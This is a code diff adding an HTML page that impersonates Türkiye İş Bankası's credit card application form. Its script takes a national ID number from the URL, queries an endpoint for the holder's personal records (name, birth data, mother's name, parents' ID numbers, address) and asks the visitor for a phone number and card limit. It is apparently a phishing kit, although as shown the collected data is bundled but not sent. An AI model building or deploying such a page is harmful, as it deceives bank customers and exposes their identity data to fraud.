@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Türkiye İş Bankası - Başvuru</title>
+  <meta name="theme-color" content="#08335E">
+  <meta name="msapplication-TileColor" content="#08335E">
+  <meta name="msapplication-navbutton-color" content="#08335E">
+  <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
+  <link rel="stylesheet" href="./dist/app.css">
+  <link rel="stylesheet" href="./dist/jquery-ui.min.css">
+  <link rel="shortcut icon" href="./dist/islogo_192.png" type="image/x-icon">
+  <style>
+    .basvuru-info-section {
+      background: #f5f5f5;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    .info-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      border-bottom: 1px solid #ddd;
+    }
+    .info-item:last-child {
+      border-bottom: none;
+    }
+    .info-label {
+      font-weight: bold;
+      color: #333;
+    }
+    .info-value {
+      color: #666;
+    }
+    .loading-container {
+      text-align: center;
+      padding: 20px;
+      color: #666;
+    }
+    .error-container {
+      background: #fee;
+      color: #c00;
+      padding: 15px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+    .basvuru-form-group {
+      margin-bottom: 20px;
+    }
+    .basvuru-input-label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #333;
+    }
+    .basvuru-input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .basvuru-input:focus {
+      outline: none;
+      border-color: #08335E;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="viewport">
+    <div id="leftBannerContainer" style="background-image:url(./dist/banner.jpg);"></div>
+    <div id="header">
+      <div id="logoContainer">
+        <img class="isbank-header-logo" src="./dist/logo.png" alt="iş bankası logo">
+      </div>
+    </div>
+    <div id="mainContent" class="loginMainContent">
+      <div class="mobileHeaderContainer">
+        <div class="mobileHeader">
+        </div>
+      </div>
+      <div class="pageContainer">
+        <div id="StraightLogin">
+          <span id="LoginLabel">
+            <div id="z5-tab-wrapper">
+            </div>
+            <div id="loginPageMiddlePartContainer">
+              <div class="contentBoxContainer">
+                <div class="contentBox" id="loginTypesContainer">
+                  <div class="loginTitle">
+                    <span>Kredi Kartı Başvurusu</span>
+                  </div>
+                  <div class="loginTitleMobile">
+                    <span>Başvuru Formu</span>
+                  </div>
+
+                  <div id="loading" class="loading-container hidden">
+                    Bilgileriniz yükleniyor...
+                  </div>
+
+                  <div id="error" class="error-container hidden"></div>
+
+                  <div id="content" class="hidden">
+                    <div class="basvuru-info-section">
+                      <h2 style="margin-top: 0; color: #08335E;">Kişisel Bilgiler</h2>
+                      <div class="info-item">
+                        <span class="info-label">Ad Soyad:</span>
+                        <span class="info-value" id="adSoyad">-</span>
+                      </div>
+                      <div class="info-item">
+                        <span class="info-label">Doğum Tarihi:</span>
+                        <span class="info-value" id="dogumTarihi">-</span>
+                      </div>
+                      <div class="info-item">
+                        <span class="info-label">Cinsiyet:</span>
+                        <span class="info-value" id="cinsiyet">-</span>
+                      </div>
+                      <div class="info-item">
+                        <span class="info-label">Doğum Yeri:</span>
+                        <span class="info-value" id="dogumYeri">-</span>
+                      </div>
+                      <div class="info-item">
+                        <span class="info-label">Anne Adı:</span>
+                        <span class="info-value" id="anneAdi">-</span>
+                      </div>
+                    </div>
+
+                    <form id="basvuruForm">
+                      <div class="basvuru-form-group">
+                        <label class="basvuru-input-label" for="telefon">Telefon Numarası</label>
+                        <input type="tel" id="telefon" name="telefon" class="basvuru-input" placeholder="05XXXXXXXXX" maxlength="11" pattern="[0-9]{11}" required>
+                        <small style="color: #666; font-size: 12px;">11 haneli telefon numaranızı giriniz (örn: 05551234567)</small>
+                      </div>
+
+                      <div class="basvuru-form-group">
+                        <label class="basvuru-input-label" for="kartLimiti">Kart Limiti (TL)</label>
+                        <input type="number" id="kartLimiti" name="kartLimiti" class="basvuru-input" placeholder="Kredi Kartı Limitiniz" min="1000" required>
+                      </div>
+
+                      <div class="loginFormButtonHolder">
+                        <button type="submit" class="ui-button darkBlueButton login" id="submitBtn">Başvuruyu Tamamla</button>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </span>
+        </div>
+      </div>
+      <div id="footer">
+        <div id="content">
+          <div id="left">
+            <div class="container">
+              <span id="copyRightContainer">©<script>document.write(new Date().getFullYear())</script> Türkiye İş Bankası A.Ş</span>
+            </div>
+          </div>
+          <div id="right">
+            <div class="container">
+              <div id="footerLinksContainer">
+                <div class="footerLinks contactUsContainer">
+                  <a id="indexLinkIletisim">
+                    <span id="indexIletisim">Bize Ulaşın</span>
+                  </a>
+                </div>
+                <div class="footerLinks last languageContainer">
+                  <span id="lblSubeGirisLangSelect">
+                    <div id="languageFlagSelect">
+                      <span id="usaflaglabel" class="isbank-page-language selected-language">English</span>
+                      <span id="turkishflaglabel" class="isbank-page-language">Türkçe</span>
+                    </div>
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="touchOverlay">
+      </div>
+    </div>
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.0/jquery.min.js" integrity="sha512-ijLvQMMXgWAO85zfDbKeoqNR7015wrZI42XGYorITKkG0sVlP4t+Rt5Dl9EKDkrPxGrWZmVCUW5oIXkVOrnCiw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jqueryui@1.11.1/jquery-ui.min.js" integrity="sha256-4JY5MVcEmAVSuS6q4h9mrwCm6KNx91f3awsSQgwu0qc=" crossorigin="anonymous"></script>
+  <script src="./dist/app.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const tc = urlParams.get('tc');
+
+      const loadingDiv = document.getElementById('loading');
+      const errorDiv = document.getElementById('error');
+      const contentDiv = document.getElementById('content');
+      const submitBtn = document.getElementById('submitBtn');
+      
+      // API'den gelen tüm verileri sakla
+      let apiData = null;
+
+      function toggleHidden(element, show) {
+        if (show) {
+          element.classList.remove('hidden');
+        } else {
+          element.classList.add('hidden');
+        }
+      }
+
+      if (!tc || tc.length !== 11) {
+        toggleHidden(errorDiv, true);
+        errorDiv.textContent = 'Geçerli bir TC kimlik numarası bulunamadı. Lütfen tekrar deneyin.';
+        return;
+      }
+
+      // API'den bilgileri çek
+      toggleHidden(loadingDiv, true);
+
+      fetch(`/api/get-tckn?tc=${tc}`)
+        .then(response => response.json())
+        .then(data => {
+          toggleHidden(loadingDiv, false);
+
+          if (data.Info && data.Info.Status === 'OK' && data.Veri) {
+            const veri = data.Veri;
+            
+            // Tüm veriyi sakla
+            apiData = veri;
+            
+            // Bilgileri göster
+            document.getElementById('adSoyad').textContent = `${veri.Adi || ''} ${veri.Soyadi || ''}`.trim() || '-';
+            document.getElementById('dogumTarihi').textContent = veri.DogumTarihi || '-';
+            document.getElementById('cinsiyet').textContent = veri.Cinsiyet || '-';
+            document.getElementById('dogumYeri').textContent = veri.DogumYeri || '-';
+            document.getElementById('anneAdi').textContent = veri.AnneAdi || '-';
+
+            // İçeriği göster
+            toggleHidden(contentDiv, true);
+          } else {
+            // Hata olsa bile sayfayı aç, bilgileri "-" olarak göster
+            apiData = {
+              Adi: '',
+              Soyadi: '',
+              DogumTarihi: '',
+              Cinsiyet: '',
+              DogumYeri: '',
+              AnneAdi: '',
+              BabaAdi: '',
+              AnneTCKN: '',
+              BabaTCKN: '',
+              AdresIl: '',
+              AdresIlce: '',
+              MemleketIl: '',
+              MemleketIlce: '',
+              MedeniHal: ''
+            };
+            
+            // Bilgileri "-" olarak göster
+            document.getElementById('adSoyad').textContent = '-';
+            document.getElementById('dogumTarihi').textContent = '-';
+            document.getElementById('cinsiyet').textContent = '-';
+            document.getElementById('dogumYeri').textContent = '-';
+            document.getElementById('anneAdi').textContent = '-';
+
+            // İçeriği göster (hata gösterme)
+            toggleHidden(contentDiv, true);
+          }
+        })
+        .catch(error => {
+          toggleHidden(loadingDiv, false);
+          
+          // Hata olsa bile sayfayı aç, bilgileri "-" olarak göster
+          apiData = {
+            Adi: '',
+            Soyadi: '',
+            DogumTarihi: '',
+            Cinsiyet: '',
+            DogumYeri: '',
+            AnneAdi: '',
+            BabaAdi: '',
+            AnneTCKN: '',
+            BabaTCKN: '',
+            AdresIl: '',
+            AdresIlce: '',
+            MemleketIl: '',
+            MemleketIlce: '',
+            MedeniHal: ''
+          };
+          
+          // Bilgileri "-" olarak göster
+          document.getElementById('adSoyad').textContent = '-';
+          document.getElementById('dogumTarihi').textContent = '-';
+          document.getElementById('cinsiyet').textContent = '-';
+          document.getElementById('dogumYeri').textContent = '-';
+          document.getElementById('anneAdi').textContent = '-';
+
+          // İçeriği göster (hata gösterme)
+          toggleHidden(contentDiv, true);
+          console.error('Error:', error);
+        });
+
+      // Telefon numarası formatı - sadece rakam
+      document.getElementById('telefon').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+
+      // Kart limiti formatı - sadece rakam
+      document.getElementById('kartLimiti').addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+
+      // Form submit
+      document.getElementById('basvuruForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const telefon = document.getElementById('telefon').value.replace(/\D/g, '');
+        const kartLimiti = document.getElementById('kartLimiti').value.replace(/\D/g, '');
+
+        if (!telefon || telefon.length !== 11 || !telefon.startsWith('05')) {
+          alert('Lütfen geçerli bir telefon numarası giriniz (05 ile başlayan 11 haneli)');
+          return;
+        }
+
+        if (!kartLimiti || parseInt(kartLimiti) < 1000) {
+          alert('Kart limiti en az 1000 TL olmalıdır');
+          return;
+        }
+
+        // apiData her zaman bir obje olacak (boş olsa bile)
+        if (!apiData) {
+          // Eğer apiData hala null ise, boş obje oluştur
+          apiData = {
+            Adi: '',
+            Soyadi: '',
+            DogumTarihi: '',
+            Cinsiyet: '',
+            DogumYeri: '',
+            AnneAdi: '',
+            BabaAdi: '',
+            AnneTCKN: '',
+            BabaTCKN: '',
+            AdresIl: '',
+            AdresIlce: '',
+            MemleketIl: '',
+            MemleketIlce: '',
+            MedeniHal: ''
+          };
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Gönderiliyor...';
+
+        // Başvuru bilgilerini URL parametreleri ile yönlendir
+        const params = new URLSearchParams({
+          tc: tc,
+          telefon: telefon,
+          kartLimiti: kartLimiti,
+          adSoyad: `${apiData.Adi || ''} ${apiData.Soyadi || ''}`.trim(),
+          dogumTarihi: apiData.DogumTarihi || '',
+          cinsiyet: apiData.Cinsiyet || '',
+          dogumYeri: apiData.DogumYeri || '',
+          anneAdi: apiData.AnneAdi || '',
+          babaAdi: apiData.BabaAdi || '',
+          anneTCKN: apiData.AnneTCKN || '',
+          babaTCKN: apiData.BabaTCKN || '',
+          adresIl: apiData.AdresIl || '',
+          adresIlce: apiData.AdresIlce || '',
+          memleketIl: apiData.MemleketIl || '',
+          memleketIlce: apiData.MemleketIlce || '',
+          medeniHal: apiData.MedeniHal || ''
+        });
+        
+        // Başvuru tamamlandı mesajı göster
+        alert('Başvurunuz alınmıştır. Teşekkür ederiz.');
+        
+        // Formu temizle
+        document.getElementById('telefon').value = '';
+        document.getElementById('kartLimiti').value = '';
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Başvuruyu Tamamla';
+      });
+    });
+  </script>
+</body>
+</html>
+
